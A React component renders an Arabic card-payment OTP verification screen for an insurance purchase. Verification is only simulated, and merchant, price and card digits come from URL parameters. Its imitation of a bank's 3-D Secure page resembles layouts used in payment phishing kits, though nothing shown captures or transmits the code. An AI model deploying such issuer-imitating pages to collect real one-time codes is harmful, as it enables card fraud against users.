import { useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

const OtpVerification = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
  const price = searchParams.get("price") || "411.15";
  const cardLast4 = searchParams.get("cardLast4") || "6636";

  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.length !== 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق المكون من 6 أرقام",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Simulate OTP verification
    setTimeout(() => {
      setIsLoading(false);
      toast({
        title: "تم التحقق بنجاح",
        description: "تم إتمام عملية الدفع بنجاح",
      });
    }, 1500);
  };

  const handleResendCode = () => {
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
    });
  };

  const currentTime = new Date().toLocaleString('ar-SA', { 
    day: '2-digit', 
    month: '2-digit', 
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
      <div className="w-full max-w-2xl bg-white border border-gray-300 rounded-lg shadow-sm p-6 animate-fade-in">
        {/* Cancel Button */}
        <div className="text-left mb-4">
          <button
            onClick={() => navigate(-1)}
            className="text-gray-600 hover:underline text-sm"
          >
            إلغاء
          </button>
        </div>

        {/* Card Image */}
        <div className="flex justify-center mb-4">
          <img 
            src="/placeholder.svg" 
            alt="Card" 
            className="w-24 h-16 object-contain"
          />
        </div>

        {/* Divider */}
        <hr className="my-4 border-gray-400" />

        {/* Language Switch */}
        <div className="text-left mb-4">
          <a href="#" className="text-sm text-[#4b6e8c] underline">
            English
          </a>
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-black mb-4">
          التحقق من عملية الدفع
        </h1>

        {/* Description */}
        <p className="mb-4 text-gray-700">
          يرجى ادخال رمز التحقق المُرسل إلى الرقم المسجل لإتمام عملية الشراء من :
        </p>

        {/* Payment Details */}
        <div className="space-y-1 mb-4 text-sm">
          <div>
            <span className="font-bold">المتجر</span>: <span>{companyName}</span>
          </div>
          <div>
            <span className="font-bold">المبلغ</span>: <span dir="ltr">{price} SAR</span>
          </div>
          <div>
            <span className="font-bold">الوقت</span>: <span>{currentTime}</span>
          </div>
        </div>

        <div className="font-bold text-black mb-6">
          تسوّق ممتع!
        </div>

        {/* OTP Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <div className="text-center text-gray-600 mb-2 text-sm">
              رمز التحقق
            </div>
            <Input
              type="text"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none"
              placeholder=""
              dir="ltr"
            />
          </div>

          <button
            type="submit"
            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded"
            disabled={isLoading || otp.length !== 6}
          >
            {isLoading ? "جاري التحقق..." : "تأكيد"}
          </button>
        </form>

        {/* Resend Code */}
        <div className="mt-12 text-center">
          <button
            type="button"
            onClick={handleResendCode}
            className="text-[#2900fc] hover:underline"
          >
            إعادة إرسال الرمز
          </button>
        </div>

        {/* Help Accordion */}
        <div className="mt-12">
          <Accordion type="single" collapsible className="space-y-2">
            <AccordionItem value="auth" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                تعرف على المزيد حول المصادقة
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
            
            <AccordionItem value="help" className="border-none">
              <AccordionTrigger className="text-[#2900fc] hover:no-underline text-right">
                بحاجة لبعض المساعدة ؟
              </AccordionTrigger>
              <AccordionContent className="text-black text-sm">
                يرجى الاتصال بخدمة العملاء على : 8001000081
              </AccordionContent>
            </AccordionItem>
          </Accordion>
        </div>
      </div>
    </div>
  );
};

export default OtpVerification;
